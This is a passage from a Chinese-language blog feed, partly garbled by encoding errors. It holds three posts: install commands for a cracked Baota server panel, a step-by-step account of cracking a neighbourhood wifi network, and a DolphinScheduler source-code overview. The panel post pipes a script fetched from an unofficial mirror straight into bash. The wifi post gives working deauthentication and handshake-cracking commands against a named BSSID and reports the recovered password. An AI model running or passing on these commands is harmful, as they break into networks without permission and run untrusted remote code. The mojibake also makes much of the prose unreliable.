class="line">ä¸»èŠ‚ç‚¹ï¼šcurl http://io.bt.sy/install/update6.sh|bash</span><br><span class="line"></span><br><span class="line">æµ·å¤–èŠ‚ç‚¹ä¸“ç”¨ï¼šcurl http://io.yu.al/install/update6.sh|bash</span><br><span class="line"></span><br><span class="line">[/van-wechat-hide]</span><br><span class="line"></span><br><span class="line">ä»¥ä¸Šå‡çº§å‘½ä»¤éƒ½å¯ä»¥å‡çº§æœ€æ–°ç‰ˆï¼</span><br></pre></td></tr></table></figure><p>è‡³æ­¤å®‰è£…å®Œæˆï¼Œæˆ‘ä»¬è¿›å…¥å®å¡”é¢æ¿ï¼ŒæŒ‰ä½Ctrl+f5åˆ·æ–°ï¼Œå¤šåˆ·æ–°å‡ æ¬¡æˆ–ç­‰å¾…ä¸€ä¸¤åˆ†é’Ÿå³å¯ã€‚</p><h2 id="7-9-0å¼€å¿ƒç‰ˆæ›´æ–°è®°å½•ï¼š"><a href="#7-9-0å¼€å¿ƒç‰ˆæ›´æ–°è®°å½•ï¼š" class="headerlink" title="7.9.0å¼€å¿ƒç‰ˆæ›´æ–°è®°å½•ï¼š"></a>7.9.0å¼€å¿ƒç‰ˆæ›´æ–°è®°å½•ï¼š</h2><p>ç³»ç»Ÿå·¥å…·ï¼šæ—¥å¿—æ¸…ç†å·¥å…·å¢åŠ 2.0ç‰ˆæœ¬ï¼</p><p>å®å¡”æ’ä»¶ï¼šå ¡å¡”ç½‘ç«™åŠ é€Ÿå¢åŠ 4.2ç‰ˆæœ¬ï¼</p><p>ä¸“ä¸šç‰ˆæ’ä»¶ï¼šç½‘ç«™ç›‘æ§æŠ¥è¡¨å¢åŠ 6.8ç‰ˆæœ¬ï¼</p><p>ä¼ä¸šç‰ˆæ’ä»¶ï¼šå ¡å¡”é˜²ææƒæ”¹åå ¡å¡”é˜²å…¥ä¾µï¼</p><p>ä¼ä¸šç‰ˆæ’ä»¶ï¼šå ¡å¡”é™åˆ¶è®¿é—®å‹è¯ä¹¦-Linuxç‰ˆå¢åŠ 1.2ç‰ˆæœ¬ï¼</p><p>ç¬¬ä¸‰æ–¹æ’ä»¶ï¼šNginxå…è´¹é˜²ç«å¢™æ›´æ–°6.3ç‰ˆæœ¬ï¼</p><p>ç¬¬ä¸‰æ–¹æ’ä»¶ï¼šç™¾åº¦ç½‘ç›˜æ›´æ–°3.9ç‰ˆæœ¬ï¼</p><p>éƒ¨åˆ†ç¬¬ä¸‰æ–¹æ’ä»¶å·²ç»å…¨éƒ¨æ›´æ–°åŒæ­¥å®˜æ–¹ï¼</p><p>ä¿®å¤ç¬¬ä¸‰æ–¹æ’ä»¶ç™¾åº¦ç½‘ç›˜æ— æ³•ä½¿ç”¨é—®é¢˜ï¼</p><p>ä¿®å¤å·²çŸ¥é“çš„ä¸€äº›æ’ä»¶åˆ°æœŸçš„é—®é¢˜ï¼</p><p>ä¿®å¤ç¬¬ä¸€æ¬¡å®‰è£…è„šæœ¬ï¼Œéœ€è¦é€€å‡ºç™»å½•é‡ç™»æ‰èƒ½å®‰è£…æ’ä»¶çš„é€»è¾‘é—®é¢˜ï¼</p><p>ä¿®å¤éƒ¨åˆ†ç”¨æˆ·ç™»å½•è™šæ‹Ÿè´¦æˆ·æ— æ³•è·å–åˆ—è¡¨authlistç©ºç™½çš„é—®é¢˜ï¼</p><p>ä¿®å¤å±é™©çº§åˆ«ï¼šç‰¹é«˜å»é™¤å®å¡”å› ä¸ºè´¦æˆ·è·Ÿå®å¡”ä¸åŒ¹é…å°banç”¨æˆ·ipé£é™©çš„é—®é¢˜ï¼ˆå¯¼è‡´æ¢å¤å…è´¹ç‰ˆä¹Ÿæ— æ³•ä½¿ç”¨ï¼Œåªèƒ½é™çº§7.7.0æ‰èƒ½ä½¿ç”¨ï¼‰ï¼</p><p>å·²æ”¯æŒArmæ„æ¶ï¼ï¼ï¼</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="ç½‘ç«™æ­å»º" scheme="http://blog.ioimp.top/categories/%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="å®å¡”é¢æ¿" scheme="http://blog.ioimp.top/tags/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF/"/>
    
  </entry>
  
  <entry>
    <title>è®°ä¸€æ¬¡å¯¹å°åŒºwifiæ¸—é€</title>
    <link href="http://blog.ioimp.top/2023/08/03/my-first-blog/"/>
    <id>http://blog.ioimp.top/2023/08/03/my-first-blog/</id>
    <published>2023-08-03T13:43:26.000Z</published>
    <updated>2023-08-03T13:49:56.399Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="wifiæ¸—é€-ä¸€"><a href="#wifiæ¸—é€-ä¸€" class="headerlink" title="wifiæ¸—é€(ä¸€)"></a>wifiæ¸—é€(ä¸€)</h1><h3 id="ç¬¬ä¸‰æ­¥â€”â€”æ£€æŸ¥å¹¶å¼€å¯ç½‘å¡çš„ç›‘å¬åŠŸèƒ½"><a href="#ç¬¬ä¸‰æ­¥â€”â€”æ£€æŸ¥å¹¶å¼€å¯ç½‘å¡çš„ç›‘å¬åŠŸèƒ½" class="headerlink" title="ç¬¬ä¸‰æ­¥â€”â€”æ£€æŸ¥å¹¶å¼€å¯ç½‘å¡çš„ç›‘å¬åŠŸèƒ½"></a>ç¬¬ä¸‰æ­¥â€”â€”æ£€æŸ¥å¹¶å¼€å¯ç½‘å¡çš„ç›‘å¬åŠŸèƒ½</h3><p>airmon-ngï¼šæ£€æŸ¥ç½‘å¡æ˜¯å¦æ”¯æŒç›‘å¬åŠŸèƒ½çš„</p><p><img src="https://picture.gotarget.top//image-20220206191950754.png" alt="image-20220206191950754"></p><p>airmon-ng start wlan0mon ï¼šæ¿€æ´»æ— çº¿ç½‘å¡çš„ç›‘å¬æ¨¡å¼</p><p><img src="https://picture.gotarget.top//image-20220206192030956.png" alt="image-20220206192030956"></p><h3 id="ç¬¬å››æ­¥â€”â€”æ‰«æå‘¨è¾¹wifiä¿¡å·"><a href="#ç¬¬å››æ­¥â€”â€”æ‰«æå‘¨è¾¹wifiä¿¡å·" class="headerlink" title="ç¬¬å››æ­¥â€”â€”æ‰«æå‘¨è¾¹wifiä¿¡å·"></a>ç¬¬å››æ­¥â€”â€”æ‰«æå‘¨è¾¹wifiä¿¡å·</h3><p>airodump-ng wlan0mon ï¼šæ‰«æå½“å‰å‘¨è¾¹ç¯å¢ƒçš„WiFiä¿¡å·</p><p><img src="https://picture.gotarget.top//image-20220206192404063.png" alt="image-20220206192404063"></p><p><strong>æ³¨æ„ï¼šæ‰¾åˆ°ä½ è¦ç ´è§£çš„wifiä¿¡æ¯ï¼Œè®°ä½å®ƒçš„BSSIDå’ŒCH,åé¢è¦ç”¨ï¼</strong></p><h3 id="ç¬¬äº”æ­¥â€”â€”æŠ“åŒ…"><a href="#ç¬¬äº”æ­¥â€”â€”æŠ“åŒ…" class="headerlink" title="ç¬¬äº”æ­¥â€”â€”æŠ“åŒ…"></a>ç¬¬äº”æ­¥â€”â€”æŠ“åŒ…</h3><p>ä¸‹é¢é‡Œçš„éƒ¨åˆ†ä¿¡æ¯æ ¹æ®è‡ªå·±çš„æƒ…å†µè¿›è¡Œæ›¿æ¢</p><p>æŠ“åŒ…å‘½ä»¤ï¼šairodump-ng -c &#x3D;&#x3D;CHå·ç &#x3D;&#x3D; â€“bssid &#x3D;&#x3D;BSSIDå·ç &#x3D;&#x3D; -w &#x2F;home&#x2F;kali&#x2F;æ¡Œé¢&#x2F;handshake wlan0mon</p><p><strong>æ³¨æ„ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-wåæ¥æŠ“åŒ…åå¾—åˆ°çš„æ–‡ä»¶ä¿å­˜è·¯å¾„å’Œåç§°ï¼Œæ³¨æ„è·¯å¾„ï¼ æˆ‘çš„ç”¨æˆ·åæ˜¯kaliï¼Œä½ çš„å¡«ä½ è‡ªå·±çš„</span><br></pre></td></tr></table></figure><p><img src="https://picture.gotarget.top//image-20220206192728797.png" alt="image-20220206192728797"></p><p><strong>æ³¨ï¼šè¿™ç§æ–¹å¼æ˜¯ä¸€ç§è¢«åŠ¨ç­‰å¾…çš„æ–¹å¼ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†é“¾æ¥åœ¨è¯¥wifiä¸Šçš„è®¾å¤‡è¸¢ä¸‹çº¿ï¼Œä»¥ä¾¿æˆ‘ä»¬å¿«é€ŸæŠ“åŒ…ã€‚</strong></p><p><strong>è¿™é‡Œæˆ‘ä»¬éœ€è¦è®°ä¸‹BSSID(WIFIè·¯ç”±åœ°å€)å’ŒSTATIONï¼ˆé“¾æ¥è®¾å¤‡å·ï¼‰ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°†è¯¥è®¾å¤‡ä»è¯¥wifié“¾æ¥çŠ¶æ€ä¸‹å¼ºåˆ¶è¸¢ä¸‹çº¿</strong></p><h3 id="ç¬¬å…­æ­¥â€”â€”æ‰“æ‰è¿æ¥"><a href="#ç¬¬å…­æ­¥â€”â€”æ‰“æ‰è¿æ¥" class="headerlink" title="ç¬¬å…­æ­¥â€”â€”æ‰“æ‰è¿æ¥"></a>ç¬¬å…­æ­¥â€”â€”æ‰“æ‰è¿æ¥</h3><p>ACK æ­»äº¡æ”»å‡»ï¼šaireplay-ng -0 10 -a BSSIDå· -c STATIONå· wlan0mon</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10â€”â€”æ˜¯æ”»å‡»æ¬¡æ•°ï¼Œä¸€èˆ¬10æ¬¡å°±è¶³å¤Ÿæˆ‘ä»¬æŠ“åˆ°åŒ…äº†ï¼Œå¦‚æœå°†æ¬¡æ•°è°ƒæ•´çš„å¾ˆå¤§ï¼Œé‚£ä¹ˆå°±ä¼šæŒç»­çš„è¿›è¡Œæ”»å‡»ï¼Œå¯¼è‡´è¯¥è®¾å¤‡é•¿æœŸæ— æ³•é“¾æ¥åˆ°è¯¥wifi!</span><br></pre></td></tr></table></figure><p><strong>æ³¨ï¼šè¿™æ ·åšå°†ä¼šå¯¼è‡´è¿æ¥åœ¨è¯¥wifiä¸Šçš„è®¾å¤‡è¢«å¼ºåˆ¶ä¸‹çº¿ï¼Œç„¶åå› ä¸ºwifiçš„è‡ªåŠ¨é‡è¿æœºåˆ¶ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥å¿«é€ŸæŠ“åˆ°åŒ…</strong>ã€‚</p><p><img src="https://picture.gotarget.top//image-20220206193900205.png" alt="image-20220206193900205"></p><h3 id="æœ€åä¸€æ­¥â€”â€”ç ´è§£"><a href="#æœ€åä¸€æ­¥â€”â€”ç ´è§£" class="headerlink" title="æœ€åä¸€æ­¥â€”â€”ç ´è§£"></a>æœ€åä¸€æ­¥â€”â€”ç ´è§£</h3><h4 id="ç ´è§£è¯­æ³•ï¼š"><a href="#ç ´è§£è¯­æ³•ï¼š" class="headerlink" title="ç ´è§£è¯­æ³•ï¼š"></a>ç ´è§£è¯­æ³•ï¼š</h4><p>aircrack-ng -w &lt;æŒ‡å®šå­—å…¸&gt; -b &lt;ç›®çš„è·¯ç”±MACåœ°å€&gt; &lt;æŠ“åˆ°çš„æ¡æ‰‹åŒ…&gt;</p><p><strong>æ³¨</strong>ï¼šç›®çš„è·¯ç”±MACåœ°å€â€”â€”å°±æ˜¯BSSID æŠ“åˆ°çš„æ¡æ‰‹åŒ…â€”â€”capæ–‡ä»¶</p><h4 id="kaliè‡ªå¸¦å­—å…¸ï¼š"><a href="#kaliè‡ªå¸¦å­—å…¸ï¼š" class="headerlink" title="kaliè‡ªå¸¦å­—å…¸ï¼š"></a>kaliè‡ªå¸¦å­—å…¸ï¼š</h4><p>aircrack-ng -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -b 78:72:5D:E0:BC:37 &#x2F;home&#x2F;kali&#x2F;æ¡Œé¢&#x2F;handshake-0*.cap</p><p><strong>éœ€è¦å…ˆè§£å‹</strong>ï¼šgzip -d &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz</p><h4 id="è‡ªæˆ‘æŒ‡å®šå­—å…¸ï¼š"><a href="#è‡ªæˆ‘æŒ‡å®šå­—å…¸ï¼š" class="headerlink" title="è‡ªæˆ‘æŒ‡å®šå­—å…¸ï¼š"></a>è‡ªæˆ‘æŒ‡å®šå­—å…¸ï¼š</h4><p>aircrack-ng -w &#x2F;home&#x2F;kali&#x2F;password.txt -b 78:72:5D:E0:BC:37 &#x2F;home&#x2F;kali&#x2F;æ¡Œé¢&#x2F;handshake-0*.cap</p><h3 id="æˆåŠŸï¼"><a href="#æˆåŠŸï¼" class="headerlink" title="æˆåŠŸï¼"></a>æˆåŠŸï¼</h3><p><img src="https://picture.gotarget.top//image-20220206164700961.png" alt="image-20220206164700961"></p><p>ç ´è§£çš„wifiå¯†ç å°±ä¸ºa123456789</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="ç½‘ç»œå®‰å…¨" scheme="http://blog.ioimp.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="ç½‘å®‰" scheme="http://blog.ioimp.top/tags/%E7%BD%91%E5%AE%89/"/>
    
  </entry>
  
  <entry>
    <title>ä¸€æ¬¡å¯¹dolphinschedulerçš„æºç åˆ†æ</title>
    <link href="http://blog.ioimp.top/2023/07/20/%E4%B8%80%E6%AC%A1%E5%AF%B9dolphinscheduler%E7%9A%84%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://blog.ioimp.top/2023/07/20/%E4%B8%80%E6%AC%A1%E5%AF%B9dolphinscheduler%E7%9A%84%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2023-07-20T01:05:10.000Z</published>
    <updated>2023-08-04T01:42:34.318Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="dolphinschedulerå­¦ä¹ "><a href="#dolphinschedulerå­¦ä¹ " class="headerlink" title="dolphinschedulerå­¦ä¹ "></a>dolphinschedulerå­¦ä¹ </h1><h2 id="DolphinScheduler-é¡¹ç›®ç»“æ„"><a href="#DolphinScheduler-é¡¹ç›®ç»“æ„" class="headerlink" title="DolphinScheduler é¡¹ç›®ç»“æ„"></a><strong>DolphinScheduler é¡¹ç›®ç»“æ„</strong></h2><p><strong>2.1 ç»“æ„åˆ†æ</strong></p><p><img src="/images/Untitled.png" alt="Untitled"></p><p>å¯¼å…¥é¡¹ç›®åï¼Œå¯ä»¥çœ‹åˆ°<strong>å…¶ä¸»è¦æ ¸å¿ƒæ¨¡å—å¦‚ä¸‹ï¼š</strong></p><table><thead><tr><th>æ¨¡å—</th><th>æè¿°</th></tr></thead><tbody><tr><td>dolphinscheduler-alert</td><td>å‘Šè­¦æ¨¡å—ï¼Œæä¾› AlertServer æœåŠ¡ã€‚</td></tr><tr><td>dolphinscheduler-api</td><td>webåº”ç”¨æ¨¡å—ï¼Œæä¾› ApiServer æœåŠ¡ã€‚</td></tr><tr><td>dolphinscheduler-common</td><td>é€šç”¨çš„å¸¸é‡æšä¸¾ã€å·¥å…·ç±»ã€æ•°æ®ç»“æ„æˆ–è€…åŸºç±»</td></tr><tr><td>dolphinscheduler-dao</td><td>æä¾›æ•°æ®åº“è®¿é—®ç­‰æ“ä½œã€‚</td></tr><tr><td>dolphinscheduler-remote</td><td>åŸºäº netty çš„å®¢æˆ·ç«¯ã€æœåŠ¡ç«¯</td></tr><tr><td>dolphinscheduler-server</td><td>MasterServer å’Œ WorkerServer æœåŠ¡</td></tr><tr><td>dolphinscheduler-service</td><td>serviceæ¨¡å—ï¼ŒåŒ…å«Quartzã€Zookeeperã€æ—¥å¿—å®¢æˆ·ç«¯è®¿é—®æœåŠ¡ï¼Œä¾¿äºserveræ¨¡å—å’Œapiæ¨¡å—è°ƒç”¨</td></tr><tr><td>dolphinscheduler-ui</td><td>å‰ç«¯æ¨¡å—</td></tr></tbody></table><p><strong>2.2 è¡¨åˆ†æ</strong></p><p>dolphinscheduler_ddl.sqlåŠdolphinscheduler_dml.sql</p><p><img src="/images/Untitled%201.png" alt="Untitled"></p><p><strong>æ‰§è¡Œå®Œåï¼Œå¯ä»¥åœ¨æ•°æ®åº“é‡Œçœ‹åˆ°æœ‰å¦‚ä¸‹è¡¨ï¼š</strong></p><table><thead><tr><th>è¡¨å</th><th>è¡¨ä¿¡æ¯</th></tr></thead><tbody><tr><td>t_ds_access_token</td><td>è®¿é—®dsåç«¯çš„token</td></tr><tr><td>t_ds_alert</td><td>å‘Šè­¦ä¿¡æ¯</td></tr><tr><td>t_ds_alertgroup</td><td>å‘Šè­¦ç»„</td></tr><tr><td>t_ds_command</td><td>æ‰§è¡Œå‘½ä»¤</td></tr><tr><td>t_ds_datasource</td><td>æ•°æ®æº</td></tr><tr><td>t_ds_error_commandï¼ˆæ ¸å¿ƒè¡¨ï¼‰</td><td>é”™è¯¯å‘½ä»¤</td></tr><tr><td>t_ds_process_definitionï¼ˆæ ¸å¿ƒè¡¨ï¼‰</td><td>æµç¨‹å®šä¹‰</td></tr><tr><td>t_ds_process_instanceï¼ˆæ ¸å¿ƒè¡¨ï¼‰</td><td>æµç¨‹å®ä¾‹</td></tr><tr><td>t_ds_project</td><td>é¡¹ç›®</td></tr><tr><td>t_ds_queue</td><td>é˜Ÿåˆ—</td></tr><tr><td>t_ds_relation_datasource_user</td><td>ç”¨æˆ·å…³è”æ•°æ®æº</td></tr><tr><td>t_ds_relation_process_instance</td><td>å­æµç¨‹</td></tr><tr><td>t_ds_relation_project_user</td><td>ç”¨æˆ·å…³è”é¡¹ç›®</td></tr><tr><td>t_ds_relation_resources_user</td><td>ç”¨æˆ·å…³è”èµ„æº</td></tr><tr><td>t_ds_relation_udfs_user</td><td>ç”¨æˆ·å…³è”UDFå‡½æ•°</td></tr><tr><td>t_ds_relation_user_alertgroup</td><td>ç”¨æˆ·å…³è”å‘Šè­¦ç»„</td></tr><tr><td>t_ds_resources</td><td>èµ„æºæ–‡ä»¶</td></tr><tr><td>t_ds_schedulesï¼ˆæ ¸å¿ƒè¡¨ï¼‰</td><td>æµç¨‹å®šæ—¶è°ƒåº¦</td></tr><tr><td>t_ds_session</td><td>ç”¨æˆ·ç™»å½•çš„session</td></tr><tr><td>t_ds_task_instanceï¼ˆæ ¸å¿ƒè¡¨ï¼‰</td><td>ä»»åŠ¡å®ä¾‹</td></tr><tr><td>t_ds_tenant</td><td>ç§Ÿæˆ·</td></tr><tr><td>t_ds_udfs</td><td>UDFèµ„æº</td></tr><tr><td>t_ds_user</td><td>ç”¨æˆ·</td></tr><tr><td>t_ds_version</td><td>dsç‰ˆæœ¬ä¿¡æ¯</td></tr></tbody></table><p><strong>2.2.1 ç±»å…³ç³»å›¾ ï¼ˆç”¨æˆ·&#x2F;é˜Ÿåˆ—&#x2F;æ•°æ®æºï¼‰</strong></p><p><strong>DS</strong></p><p><img src="/images/image%201.png" alt="1"></p><p><strong>æè¿°å¦‚ä¸‹ï¼š</strong></p><ul><li>ä¸€ä¸ªç§Ÿæˆ·ä¸‹å¯ä»¥æœ‰å¤šä¸ªç”¨æˆ·ï¼›</li><li><code>t_ds_user</code>ä¸­çš„<code>queue</code>å­—æ®µå­˜å‚¨çš„æ˜¯é˜Ÿåˆ—è¡¨ä¸­çš„<code>queue_name</code>ä¿¡æ¯;</li><li><code>t_ds_tenant</code>ä¸‹å­˜çš„æ˜¯<code>queue_id</code>ï¼Œåœ¨æµç¨‹å®šä¹‰æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œç”¨æˆ·é˜Ÿåˆ—ä¼˜å…ˆçº§æœ€é«˜ï¼Œç”¨æˆ·é˜Ÿåˆ—ä¸ºç©ºåˆ™é‡‡ç”¨ç§Ÿæˆ·é˜Ÿåˆ—ï¼›</li><li><code>t_ds_datasource</code>è¡¨ä¸­çš„<code>user_id</code>å­—æ®µè¡¨ç¤ºåˆ›å»ºè¯¥æ•°æ®æºçš„ç”¨æˆ·;</li><li><code>t_ds_relation_datasource_user</code>ä¸­çš„<code>user_id</code>è¡¨ç¤ºï¼Œå¯¹æ•°æ®æºæœ‰æƒé™çš„ç”¨æˆ·ã€‚</li></ul><p><strong>2.2.2 ç±»å…³ç³»å›¾ ï¼ˆé¡¹ç›®&#x2F;èµ„æº&#x2F;å‘Šè­¦ï¼‰</strong></p><p><strong>DS</strong></p><p><img src="/images/image%201.png" alt="2"></p><p><strong>æè¿°å¦‚ä¸‹ï¼š</strong></p><ul><li><strong>ä¸€ä¸ªç”¨æˆ·å¯ä»¥æœ‰å¤šä¸ªé¡¹ç›®ï¼Œç”¨æˆ·é¡¹ç›®æˆæƒé€šè¿‡t_ds_relation_project_userè¡¨å®Œæˆproject_idå’Œuser_idçš„å…³ç³»ç»‘å®š</strong>ï¼›</li><li>t_ds_projcetè¡¨ä¸­çš„user_idè¡¨ç¤ºåˆ›å»ºè¯¥é¡¹ç›®çš„ç”¨æˆ·ï¼›</li><li>t_ds_relation_project_userè¡¨ä¸­çš„user_idè¡¨ç¤ºå¯¹é¡¹ç›®æœ‰æƒé™çš„ç”¨æˆ·ï¼›</li><li>t_ds_resourcesè¡¨ä¸­çš„user_idè¡¨ç¤ºåˆ›å»ºè¯¥èµ„æºçš„ç”¨æˆ·ï¼›</li><li>t_ds_relation_resources_userä¸­çš„user_idè¡¨ç¤ºå¯¹èµ„æºæœ‰æƒé™çš„ç”¨æˆ·ï¼›</li><li>t_ds_udfsè¡¨ä¸­çš„user_idè¡¨ç¤ºåˆ›å»ºè¯¥UDFçš„ç”¨æˆ·ï¼›</li><li>t_ds_relation_udfs_userè¡¨ä¸­çš„user_idè¡¨ç¤ºå¯¹UDFæœ‰æƒé™çš„ç”¨æˆ·ã€‚</li></ul><p><strong>2.2.3 ç±»å…³ç³»å›¾ ï¼ˆ å‘½ä»¤&#x2F;æµç¨‹&#x2F;ä»»åŠ¡ï¼‰</strong></p><p><strong>DS</strong><br><img src="/images/image3.png" alt="3"></p><p><img src="/images/image4.png" alt="4"></p><p><strong>æè¿°å¦‚ä¸‹ï¼š</strong></p><ul><li><strong>ä¸€ä¸ªé¡¹ç›®æœ‰å¤šä¸ªæµç¨‹å®šä¹‰ï¼Œä¸€ä¸ªæµç¨‹å®šä¹‰å¯ä»¥ç”Ÿæˆå¤šä¸ªæµç¨‹å®ä¾‹ï¼Œä¸€ä¸ªæµç¨‹å®ä¾‹å¯ä»¥ç”Ÿæˆå¤šä¸ªä»»åŠ¡å®ä¾‹</strong>ï¼›</li><li>t_ds_schedulersè¡¨å­˜æ”¾æµç¨‹å®šä¹‰çš„å®šæ—¶è°ƒåº¦ä¿¡æ¯ï¼›</li><li>t_ds_relation_process_instanceè¡¨å­˜æ”¾çš„æ•°æ®ç”¨äºå¤„ç†æµç¨‹å®šä¹‰ä¸­å«æœ‰å­æµç¨‹çš„æƒ…å†µï¼Œparent_process_instance_idè¡¨ç¤ºå«æœ‰å­æµç¨‹çš„ä¸»æµç¨‹å®ä¾‹idï¼Œprocess_instance_idè¡¨ç¤ºå­æµç¨‹å®ä¾‹çš„idï¼Œparent_task_instance_idè¡¨ç¤ºå­æµç¨‹èŠ‚ç‚¹çš„ä»»åŠ¡å®ä¾‹idï¼Œæµç¨‹å®ä¾‹è¡¨å’Œä»»åŠ¡å®ä¾‹è¡¨åˆ†åˆ«å¯¹åº”t_ds_process_instanceè¡¨å’Œt_ds_task_instanceè¡¨</li></ul><p><strong>03</strong></p><p><strong>DolphinScheduler æºç åˆ†æ</strong></p><p>è®²è§£æºç å‰ï¼Œå…ˆè´´ä¸€ä»½å®˜ç½‘çš„å¯åŠ¨æµç¨‹å›¾ï¼š</p><p><img src="/images/image5.png" alt="5"></p><p><strong>3.1 ExecutorController</strong></p><p><strong>DS</strong></p><p>org.apache.dolphinscheduler.api.controller.ExecutorController</p><p><img src="/images/image6.png" alt="6 text"></p><p>ä»¥ä¸‹æ˜¯å¯¹å„æ¥å£çš„æè¿°ï¼š</p><table><thead><tr><th>æ¥å£</th><th>æè¿°</th></tr></thead><tbody><tr><td>&#x2F;start-process-instance</td><td>æ‰§è¡Œæµç¨‹å®ä¾‹</td></tr><tr><td>&#x2F;batch-start-process-instance</td><td>æ‰¹é‡æ‰§è¡Œæµç¨‹å®ä¾‹</td></tr><tr><td>&#x2F;execute</td><td>æ“ä½œæµç¨‹å®ä¾‹ï¼Œå¦‚ï¼šæš‚åœ, åœæ­¢, é‡è·‘, ä»æš‚åœæ¢å¤,ä»åœæ­¢æ¢å¤</td></tr><tr><td>&#x2F;batch-execute</td><td>æ‰¹é‡æ“ä½œæµç¨‹å®ä¾‹</td></tr><tr><td>&#x2F;start-check</td><td>æ£€æŸ¥æµç¨‹å®šä¹‰æˆ–æ£€æŸ¥æ‰€æœ‰çš„å­æµç¨‹å®šä¹‰æ˜¯å¦åœ¨çº¿</td></tr></tbody></table><p>æ¥ä¸‹æˆ‘ä»¬çœ‹çœ‹æœ€æ ¸å¿ƒçš„æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * do action to process instance: pause, stop, repeat, recover from pause, recover from stop</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> loginUser login user</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> projectCode project code</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> processInstanceId process instance id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> executeType execute type</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> execute result code</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ApiOperation(value = &quot;execute&quot;, notes = &quot;EXECUTE_ACTION_TO_PROCESS_INSTANCE_NOTES&quot;)</span></span><br><span class="line">    <span class="meta">@ApiImplicitParams(&#123;</span></span><br><span class="line"><span class="meta">            @ApiImplicitParam(name = &quot;processInstanceId&quot;, value = &quot;PROCESS_INSTANCE_ID&quot;, required = true, dataType = &quot;Int&quot;, example = &quot;100&quot;),</span></span><br><span class="line"><span class="meta">            @ApiImplicitParam(name = &quot;executeType&quot;, value = &quot;EXECUTE_TYPE&quot;, required = true, dataType = &quot;ExecuteType&quot;)</span></span><br><span class="line"><span class="meta">    &#125;)</span></span><br><span class="line">    <span class="meta">@PostMapping(value = &quot;/execute&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseStatus(HttpStatus.OK)</span></span><br><span class="line">    <span class="meta">@ApiException(EXECUTE_PROCESS_INSTANCE_ERROR)</span></span><br><span class="line">    <span class="meta">@AccessLogAnnotation(ignoreRequestArgs = &quot;loginUser&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Result <span class="title function_">execute</span><span class="params">(<span class="meta">@ApiIgnore</span> <span class="meta">@RequestAttribute(value = Constants.SESSION_USER)</span> User loginUser,</span></span><br><span class="line"><span class="params">                          <span class="meta">@ApiParam(name = &quot;projectCode&quot;, value = &quot;PROJECT_CODE&quot;, required = true)</span> <span class="meta">@PathVariable</span> <span class="type">long</span> projectCode,</span></span><br><span class="line"><span class="params">                          <span class="meta">@RequestParam(&quot;processInstanceId&quot;)</span> Integer processInstanceId,</span></span><br><span class="line"><span class="params">                          <span class="meta">@RequestParam(&quot;executeType&quot;)</span> ExecuteType executeType</span></span><br><span class="line"><span class="params">    )</span> &#123;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">result</span> <span class="operator">=</span> execService.execute(loginUser, projectCode, processInstanceId, executeType);</span><br><span class="line">        <span class="keyword">return</span> returnDataList(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°executeæ¥å£ï¼Œæ˜¯ç›´æ¥ä½¿ç”¨ExecServiceå»æ‰§è¡Œäº†ï¼Œä¸‹é¢åˆ†æä¸‹ã€‚</p><p><strong>3.2 